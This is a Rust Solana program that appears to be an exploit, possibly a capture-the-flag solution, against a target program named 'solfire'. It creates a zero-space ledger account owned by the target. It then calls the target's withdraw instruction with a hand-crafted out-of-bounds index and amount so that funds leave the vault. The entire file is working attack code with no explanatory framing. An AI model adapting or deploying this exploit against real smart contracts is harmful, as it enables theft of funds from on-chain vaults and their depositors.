use solana_program::{
    account_info::{next_account_info, AccountInfo},
    entrypoint,
    entrypoint::ProgramResult,
    instruction::{AccountMeta, Instruction},
    program::{invoke, invoke_signed},
    pubkey::Pubkey,
    system_instruction,
};

entrypoint!(process_instruction);

pub fn process_instruction(
    _program_id: &Pubkey,
    accounts: &[AccountInfo],
    instruction_data: &[u8],
) -> ProgramResult {
    let accounts_iter = &mut accounts.iter();
    let clock_info = next_account_info(accounts_iter)?;
    let system_info = next_account_info(accounts_iter)?;
    let ledger_info = next_account_info(accounts_iter)?;
    let vault_info = next_account_info(accounts_iter)?;
    let user_info = next_account_info(accounts_iter)?;
    let solfire_info = next_account_info(accounts_iter)?;

    let ledger_nonce = instruction_data[0];
    let vault_nonce = instruction_data[1];

    // 1. Create zero-space account
    let create_ix = system_instruction::create_account(
        user_info.key,
        ledger_info.key,
        0, // lamports
        0, // space
        solfire_info.key,
    );
    
    let ledger_seeds: &[&[u8]] = &[&[ledger_nonce]];
    invoke_signed(
        &create_ix,
        &[
            user_info.clone(),
            ledger_info.clone(),
            system_info.clone(),
            solfire_info.clone(),
        ],
        &[ledger_seeds],
    )?;

    // 2. OOB Withdraw
    let mut data = vec![0u8; 16];
    data[0] = 2;          // handle_withdraw instruction code
    data[4] = 0x80;       // index = 0x280
    data[5] = 0x02;
    data[8] = 0x00;       // amount = 0x10000 (65536)
    data[9] = 0x00;
    data[10] = 0x01;
    data[12] = vault_nonce;

    let withdraw_ix = Instruction {
        program_id: *solfire_info.key,
        accounts: vec![
            AccountMeta::new_readonly(*clock_info.key, false),
            AccountMeta::new_readonly(*system_info.key, false),
            AccountMeta::new(*ledger_info.key, false),
            AccountMeta::new(*user_info.key, true),
            AccountMeta::new(*vault_info.key, false),
        ],
        data,
    };

    invoke(
        &withdraw_ix,
        &[
            clock_info.clone(),
            system_info.clone(),
            ledger_info.clone(),
            user_info.clone(),
            vault_info.clone(),
        ],
    )?;

    Ok(())
}